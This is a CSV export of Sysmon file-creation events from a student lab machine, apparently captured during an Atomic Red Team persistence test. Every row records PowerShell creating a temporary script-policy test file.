"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:18:50.947 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173565,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_5zugvkzv.ilx.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400","CreationUtcTime: 2025-12-26 10:18:50.943 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:50.943","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.090 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173569,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_2g0ii2jn.cob.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.088 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.088","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.371 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173581,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_v2vvag3r.low.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.361 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.361","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.262 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173594,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_3zoykjzr.uxd.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.254 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.254","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:05.413 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173606,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_sshbopao.e1w.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:05.408 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:05.408","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.589 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173614,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_pab024p0.lsq.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400","CreationUtcTime: 2025-12-26 10:19:07.585 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:07.585","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:08.421 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173617,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_0huzvs1n.lxw.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400","CreationUtcTime: 2025-12-26 10:19:08.419 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:08.419","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.201 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173620,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_dnav5nq1.0ya.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400","CreationUtcTime: 2025-12-26 10:19:11.189 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:11.189","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:12.557 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173624,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_bijbv0vc.twd.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400","CreationUtcTime: 2025-12-26 10:19:12.548 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:12.548","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.851 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173627,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_jbebb3p5.5ei.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400","CreationUtcTime: 2025-12-26 10:19:13.850 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:13.850","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
